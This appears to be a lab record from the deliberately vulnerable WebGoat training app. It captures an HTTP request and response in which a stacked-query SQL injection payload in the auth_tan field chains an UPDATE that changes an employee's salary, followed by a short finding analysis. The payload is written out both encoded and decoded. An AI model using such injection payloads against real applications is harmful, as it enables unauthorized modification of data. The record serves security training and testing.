@@ -1,0 +1,38 @@
+Lesson: SQL Injection (intro) / assignment SqlInjectionLesson9 ("Compromising Integrity with Query chaining")
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:17:03Z
+
+### Request
+POST http://10.242.10.31:8007/WebGoat/SqlInjection/attack9 HTTP/1.1
+Referer: http://10.242.10.31:8007/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 99
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+Origin: http://10.242.10.31:8007
+Host: 10.242.10.31:8007
+
+name=Smith&auth_tan=3SL99A'%3B+UPDATE+employees+SET+salary%3D999999999+WHERE+last_name%3D'Smith'+--
+
+(decoded auth_tan: 3SL99A'; UPDATE employees SET salary=999999999 WHERE last_name='Smith' --)
+
+### Response
+HTTP/1.1 200
+Content-Type: application/json
+Content-Length: 1128
+
+{
+  "assignment" : "SqlInjectionLesson9",
+  "attemptWasMade" : true,
+  "feedback" : "Well done! Now you are earning the most money. And at the same time you successfully compromised the integrity of data by changing your salary!",
+  "lessonCompleted" : true,
+  "output" : "<table>... John Smith SALARY now 999999999 ...</table>"
+}
+
+### Analysis (finding F-SQLI-04)
+Stacked-query (query-chaining) SQL injection: the legitimate auth_tan value was followed by `; UPDATE ...`
+and the server executed BOTH statements in a single request, letting an authenticated-as-self user silently
+modify a SELECT-only lookup field into an arbitrary UPDATE on a table they should only be able to read from
+(their own salary, via a value nothing in the UI exposes as editable). This is the lesson's own intended
+data-integrity "solve", confined to the lesson's own sandboxed employees table (Section 6 guardrail compliant
+- no destructive DROP/DELETE/TRUNCATE used).
+Severity: HIGH per Section 3j rubric - full integrity-bypass (unauthorized write) via SQLi without RCE.
